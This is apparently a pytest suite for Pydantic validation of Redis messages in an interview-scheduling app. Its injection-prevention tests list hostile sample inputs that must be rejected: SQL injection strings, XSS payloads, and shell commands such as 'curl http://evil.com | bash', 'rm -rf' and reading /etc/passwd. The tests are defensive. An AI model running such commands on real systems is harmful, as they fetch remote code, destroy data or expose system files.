"""
Test suite for Redis message validation models (Critical Issue #4).
Tests Pydantic validation, sanitization, and security measures.
"""
import pytest
import sys
import os
from uuid import UUID, uuid4
from pydantic import ValidationError

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Mock environment variables
os.environ['UPSTASH_REDIS_URL'] = 'redis://mock-url:6379'
os.environ['UPSTASH_REDIS_TOKEN'] = 'mock-token'

from app.models.redis_messages import (
    PromptReadyMessage,
    RAGStatusMessage,
    RedisMessage
)


class TestPromptReadyMessage:
    """Tests for PromptReadyMessage validation"""
    
    def test_valid_message(self):
        """Test that valid messages pass validation"""
        print("\n=== Test 1: Valid PromptReadyMessage ===")
        
        valid_data = {
            "interview_id": str(uuid4()),
            "enhanced_prompt": "This is a valid interview prompt that is long enough to pass validation.",
            "source": "rag"
        }
        
        message = PromptReadyMessage(**valid_data)
        
        assert isinstance(message.interview_id, UUID)
        assert message.enhanced_prompt == valid_data["enhanced_prompt"]
        assert message.source == "rag"
        
        print(f"✓ Valid message accepted: {message.interview_id}")
        print("✅ Test 1 PASSED")
    
    def test_missing_required_fields(self):
        """Test that missing required fields are caught"""
        print("\n=== Test 2: Missing Required Fields ===")
        
        # Missing interview_id
        with pytest.raises(ValidationError) as exc_info:
            PromptReadyMessage(
                enhanced_prompt="Valid prompt text here",
                source="rag"
            )
        
        errors = exc_info.value.errors()
        assert any(e['loc'] == ('interview_id',) for e in errors)
        print("✓ Missing interview_id caught")
        
        # Missing enhanced_prompt
        with pytest.raises(ValidationError) as exc_info:
            PromptReadyMessage(
                interview_id=str(uuid4()),
                source="rag"
            )
        
        errors = exc_info.value.errors()
        assert any(e['loc'] == ('enhanced_prompt',) for e in errors)
        print("✓ Missing enhanced_prompt caught")
        
        print("✅ Test 2 PASSED")
    
    def test_invalid_uuid(self):
        """Test that invalid UUIDs are rejected"""
        print("\n=== Test 3: Invalid UUID ===")
        
        invalid_uuids = [
            "not-a-uuid",
            "12345",
            "'; DROP TABLE interviews; --",
            "",
            None
        ]
        
        for invalid_uuid in invalid_uuids:
            with pytest.raises(ValidationError) as exc_info:
                PromptReadyMessage(
                    interview_id=invalid_uuid,
                    enhanced_prompt="Valid prompt text here",
                    source="rag"
                )
            
            errors = exc_info.value.errors()
            assert any(e['loc'] == ('interview_id',) for e in errors)
            print(f"✓ Rejected invalid UUID: {invalid_uuid}")
        
        print("✅ Test 3 PASSED")
    
    def test_prompt_length_validation(self):
        """Test that prompt length is enforced"""
        print("\n=== Test 4: Prompt Length Validation ===")
        
        # Too short (less than 10 chars)
        with pytest.raises(ValidationError) as exc_info:
            PromptReadyMessage(
                interview_id=str(uuid4()),
                enhanced_prompt="short",
                source="rag"
            )
        
        errors = exc_info.value.errors()
        assert any('enhanced_prompt' in str(e['loc']) for e in errors)
        print("✓ Rejected prompt too short (< 10 chars)")
        
        # Too long (more than 50,000 chars)
        with pytest.raises(ValidationError) as exc_info:
            PromptReadyMessage(
                interview_id=str(uuid4()),
                enhanced_prompt="x" * 50001,
                source="rag"
            )
        
        errors = exc_info.value.errors()
        assert any('enhanced_prompt' in str(e['loc']) for e in errors)
        print("✓ Rejected prompt too long (> 50,000 chars)")
        
        print("✅ Test 4 PASSED")
    
    def test_sql_injection_prevention(self):
        """Test that SQL injection attempts are blocked"""
        print("\n=== Test 5: SQL Injection Prevention ===")
        
        sql_injection_attempts = [
            "Valid prompt'; DROP TABLE interviews; --",
            "Valid prompt; DELETE FROM users WHERE 1=1;",
            "Valid prompt UNION SELECT * FROM passwords",
            "Valid prompt'; INSERT INTO admin VALUES ('hacker', 'pass');",
            "Valid prompt; UPDATE users SET role='admin' WHERE id=1;",
            "Valid prompt; TRUNCATE TABLE sessions;",
            "Valid prompt; ALTER TABLE users ADD COLUMN hacked INT;",
            "Valid prompt; EXEC('malicious code');",
            "Valid prompt; xp_cmdshell('rm -rf /');",
        ]
        
        for injection in sql_injection_attempts:
            with pytest.raises(ValidationError) as exc_info:
                PromptReadyMessage(
                    interview_id=str(uuid4()),
                    enhanced_prompt=injection,
                    source="rag"
                )
            
            error_msg = str(exc_info.value)
            assert "suspicious" in error_msg.lower() or "sql" in error_msg.lower()
            print(f"✓ Blocked SQL injection: {injection[:50]}...")
        
        print("✅ Test 5 PASSED - All SQL injection attempts blocked")
    
    def test_xss_prevention(self):
        """Test that XSS attempts are blocked"""
        print("\n=== Test 6: XSS Prevention ===")
        
        xss_attempts = [
            "Valid prompt <script>alert('xss')</script>",
            "Valid prompt <img src=x onerror=alert('xss')>",
            "Valid prompt <iframe src='javascript:alert(1)'></iframe>",
            "Valid prompt <body onload=alert('xss')>",
            "Valid prompt javascript:alert(document.cookie)",
            "Valid prompt <div onmouseover=alert('xss')>",
            "Valid prompt eval('malicious code')",
        ]
        
        for xss in xss_attempts:
            with pytest.raises(ValidationError) as exc_info:
                PromptReadyMessage(
                    interview_id=str(uuid4()),
                    enhanced_prompt=xss,
                    source="rag"
                )
            
            error_msg = str(exc_info.value)
            assert "suspicious" in error_msg.lower() or "xss" in error_msg.lower()
            print(f"✓ Blocked XSS attempt: {xss[:50]}...")
        
        print("✅ Test 6 PASSED - All XSS attempts blocked")
    
    def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked"""
        print("\n=== Test 7: Command Injection Prevention ===")
        
        command_injection_attempts = [
            "Valid prompt; rm -rf /important/files",
            "Valid prompt; wget http://evil.com/malware.sh",
            "Valid prompt; curl http://evil.com | bash",
            "Valid prompt; shutdown -h now",
            "Valid prompt; format c: /y",
            "Valid prompt `cat /etc/passwd`",
            "Valid prompt $(whoami)",
        ]
        
        for injection in command_injection_attempts:
            with pytest.raises(ValidationError) as exc_info:
                PromptReadyMessage(
                    interview_id=str(uuid4()),
                    enhanced_prompt=injection,
                    source="rag"
                )
            
            error_msg = str(exc_info.value)
            assert "suspicious" in error_msg.lower() or "command" in error_msg.lower()
            print(f"✓ Blocked command injection: {injection[:50]}...")
        
        print("✅ Test 7 PASSED - All command injection attempts blocked")
    
    def test_valid_source_values(self):
        """Test that only valid source values are accepted"""
        print("\n=== Test 8: Source Field Validation ===")
        
        valid_sources = ["rag", "existing_data", "new_data", "fallback"]
        
        for source in valid_sources:
            message = PromptReadyMessage(
                interview_id=str(uuid4()),
                enhanced_prompt="Valid prompt text here",
                source=source
            )
            assert message.source == source
            print(f"✓ Accepted valid source: {source}")
        
        # Test invalid source
        with pytest.raises(ValidationError):
            PromptReadyMessage(
                interview_id=str(uuid4()),
                enhanced_prompt="Valid prompt text here",
                source="invalid_source"
            )
        print("✓ Rejected invalid source")
        
        print("✅ Test 8 PASSED")
    
    def test_default_source_value(self):
        """Test that source defaults to 'rag'"""
        print("\n=== Test 9: Default Source Value ===")
        
        message = PromptReadyMessage(
            interview_id=str(uuid4()),
            enhanced_prompt="Valid prompt text here"
        )
        
        assert message.source == "rag"
        print("✓ Source defaults to 'rag'")
        print("✅ Test 9 PASSED")
    
    def test_whitespace_handling(self):
        """Test that whitespace in prompts is preserved as-is (no automatic stripping)"""
        print("\n=== Test 10: Whitespace Handling ===")
        
        # Whitespace is preserved in Pydantic v2 (no automatic stripping)
        message = PromptReadyMessage(
            interview_id=str(uuid4()),
            enhanced_prompt="  Valid prompt with internal   spaces  ",
            source="rag"
        )
        
        # Internal spaces and leading/trailing are preserved
        assert "Valid prompt" in message.enhanced_prompt
        assert message.enhanced_prompt == "  Valid prompt with internal   spaces  "
        print("✓ Prompt whitespace preserved as-is")
        
        # Source must be exact literal value
        message2 = PromptReadyMessage(
            interview_id=str(uuid4()),
            enhanced_prompt="Valid prompt text here",
            source="rag"  # Must be exact
        )
        assert message2.source == "rag"
        print("✓ Source field validated correctly")
        
        print("✅ Test 10 PASSED")


class TestRAGStatusMessage:
    """Tests for RAGStatusMessage validation"""
    
    def test_valid_status_message(self):
        """Test that valid status messages pass validation"""
        print("\n=== Test 11: Valid RAGStatusMessage ===")
        
        valid_data = {
            "interview_id": str(uuid4()),
            "status": "processing",
            "error_message": None
        }
        
        message = RAGStatusMessage(**valid_data)
        
        assert isinstance(message.interview_id, UUID)
        assert message.status == "processing"
        assert message.error_message is None
        
        print("✓ Valid status message accepted")
        print("✅ Test 11 PASSED")
    
    def test_valid_status_values(self):
        """Test that only valid status values are accepted"""
        print("\n=== Test 12: Status Value Validation ===")
        
        valid_statuses = ["pending", "processing", "ready", "failed", "completed", "cancelled"]
        
        for status in valid_statuses:
            message = RAGStatusMessage(
                interview_id=str(uuid4()),
                status=status
            )
            assert message.status == status
            print(f"✓ Accepted valid status: {status}")
        
        # Test invalid status
        with pytest.raises(ValidationError):
            RAGStatusMessage(
                interview_id=str(uuid4()),
                status="invalid_status"
            )
        print("✓ Rejected invalid status")
        
        print("✅ Test 12 PASSED")
    
    def test_error_message_sanitization(self):
        """Test that error messages are sanitized"""
        print("\n=== Test 13: Error Message Sanitization ===")
        
        # Test newline removal
        message = RAGStatusMessage(
            interview_id=str(uuid4()),
            status="failed",
            error_message="Error line 1\nError line 2\rError line 3"
        )
        
        assert '\n' not in message.error_message
        assert '\r' not in message.error_message
        print("✓ Newlines removed from error message")
        
        # Test length limit with validator truncation
        long_error = "x" * 999  # Just under 1000
        message = RAGStatusMessage(
            interview_id=str(uuid4()),
            status="failed",
            error_message=long_error
        )
        
        assert len(message.error_message) == 999
        print("✓ Error message under 1000 chars accepted")
        
        # Test that exact 1000 is accepted
        exact_error = "x" * 1000
        message = RAGStatusMessage(
            interview_id=str(uuid4()),
            status="failed",
            error_message=exact_error
        )
        
        assert len(message.error_message) == 1000
        print("✓ Error message at exactly 1000 chars accepted")
        
        # Test that over 1000 gets truncated by validator
        over_limit = "x" * 1500
        message = RAGStatusMessage(
            interview_id=str(uuid4()),
            status="failed",
            error_message=over_limit
        )
        
        assert len(message.error_message) == 1000  # 997 + "..."
        assert message.error_message.endswith("...")
        print("✓ Error message over 1000 chars truncated to 1000")
        
        print("✅ Test 13 PASSED")
    
    def test_optional_error_message(self):
        """Test that error_message is optional"""
        print("\n=== Test 14: Optional Error Message ===")
        
        message = RAGStatusMessage(
            interview_id=str(uuid4()),
            status="processing"
        )
        
        assert message.error_message is None
        print("✓ Error message is optional")
        print("✅ Test 14 PASSED")


class TestRedisMessage:
    """Tests for RedisMessage (envelope) validation"""
    
    def test_valid_redis_message(self):
        """Test that valid Redis messages pass validation"""
        print("\n=== Test 15: Valid RedisMessage ===")
        
        valid_data = {
            "channel": "interviewly:prompt-ready",
            "data": {
                "interview_id": str(uuid4()),
                "enhanced_prompt": "Valid prompt text here",
                "source": "rag"
            }
        }
        
        message = RedisMessage(**valid_data)
        
        assert message.channel == "interviewly:prompt-ready"
        assert isinstance(message.data, dict)
        
        print("✓ Valid Redis message accepted")
        print("✅ Test 15 PASSED")
    
    def test_channel_validation(self):
        """Test that only valid channels are accepted"""
        print("\n=== Test 16: Channel Validation ===")
        
        valid_channels = [
            "interviewly:prompt-ready",
            "interviewly:rag-status",
            "interviewly:interview-start",
            "interviewly:interview-end"
        ]
        
        for channel in valid_channels:
            message = RedisMessage(
                channel=channel,
                data={"test": "data"}
            )
            assert message.channel == channel
            print(f"✓ Accepted valid channel: {channel}")
        
        # Test invalid channels
        invalid_channels = [
            "invalid:channel",
            "prompt-ready",  # Missing 'interviewly:' prefix
            "interviewly:unknown",
            "malicious:channel"
        ]
        
        for channel in invalid_channels:
            with pytest.raises(ValidationError):
                RedisMessage(
                    channel=channel,
                    data={"test": "data"}
                )
            print(f"✓ Rejected invalid channel: {channel}")
        
        print("✅ Test 16 PASSED")


if __name__ == "__main__":
    # Run all tests
    pytest.main([__file__, "-v", "-s"])
